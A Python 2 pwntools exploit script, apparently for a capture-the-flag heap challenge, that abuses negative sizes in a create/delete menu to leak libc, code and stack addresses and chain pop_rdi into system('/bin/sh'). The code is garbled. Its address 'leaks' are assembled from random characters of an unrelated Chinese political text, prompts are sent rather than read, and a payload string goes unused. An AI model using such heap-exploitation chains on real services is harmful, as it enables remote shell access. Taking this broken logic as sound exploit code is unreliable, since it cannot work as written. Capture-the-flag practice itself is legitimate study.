#!/usr/bin/env python2
# -*- coding:utf-8

import struct

from pwn import *
from random import *

strings = "美国政府近日依据调查结果公布拟加征关税的中国商品建议清单并威胁进一步出台加税措施这种单边主义和贸易保护主义行径遭到中国坚决反对被国际有识之士广泛批评美国此举有违世贸组织原则和精神是对国际商业社会所秉持的契约精神的严重践踏也是对现行多边贸易体系的公然挑衅"
payload = ''


def to_addr(n):
    return struct.pack('Q', n)


def to_n(addr):
    return struct.unpack('Q', addr)[0]


def line_up(pc):
    global payload

    pc.sendline('Choice: ')
    payload += '0\n'


def do_head_count(pc):
    global payload

    pc.sendline('Choice: ')
    payload += '1\n'


def create_char(pc, name, age, inter=False):
    global payload

    if inter:
        pass
    else:
        pc.sendline('Choice: ')
        pc.sendline('name?')
        pc.sendline('age?')


def delete(pc):
    global payload

    pc.sendline('Choice: ')
    payload += '3\n'


def main(pc, libc):
    binsh = list(libc.search('/bin/sh'))[0]
    setvbuf_of = 0x201FC0
    pop_rdi = 0x11c3
    pivot = 0xb29

    print(hex(libc.symbols['system']), hex(binsh))

    create_char(pc, 'OOOO', 0xf0)
    create_char(pc, 'FFFF', 0x60)
    create_char(pc, 'DDDD', 0x40)
    create_char(pc, 'BBBB', 0x20)
    create_char(pc, 'EEEE', 0x50)

    delete(pc)
    delete(pc)
    delete(pc)
    delete(pc)
    delete(pc)
    delete(pc)

    line_up(pc)

    create_char(pc, 'A', -16)

    delete(pc)

    do_head_count(pc)

    delete(pc)

    pc.recvline()
    system = to_n(
        strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[randint(1, len(strings))] +
        strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[
            randint(1, len(strings))] + '\x00\x00') - libc.symbols['printf'] - 166 + libc.symbols['system']
    binsha = system - libc.symbols['system'] + binsh

    delete(pc)
    delete(pc)

    line_up(pc)

    create_char(pc, 'A', -141)
    delete(pc)

    do_head_count(pc)

    delete(pc)

    pc.recvline()
    base_code = to_n(
        strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[randint(1, len(strings))] +
        strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[
            randint(1, len(strings))] + '\x00\x00') - 0x459
    setvbuf = base_code + setvbuf_of

    delete(pc)
    delete(pc)

    line_up(pc)

    create_char(pc, 'A', -18)

    delete(pc)

    do_head_count(pc)

    delete(pc)

    pc.recvline()
    stack = to_n(
        strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[randint(1, len(strings))] +
        strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[
            randint(1, len(strings))] + '\x00\x00')
    towrite = stack - 1376

    print('Stack: ' + hex(stack))
    print('To write: ' + hex(towrite))

    delete(pc)
    delete(pc)

    line_up(pc)

    create_char(pc, 'A', -56)


    create_char(pc, to_addr(base_code + pop_rdi), 0x42424242)
    create_char(pc, to_addr(system), binsha)

    do_head_count(pc)

    delete(pc)
    delete(pc)

    line_up(pc)

    create_char(pc, 'A', -3)


def method1(ip,port):
#if __name__ == "__main__":
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    log.info("Method 1 applied!")
    # pc = process('./how2heap')
    # pc = remote('challenges1.uiuc.tf', 38910)
    pc = remote(ip, port)

    main(pc, libc)
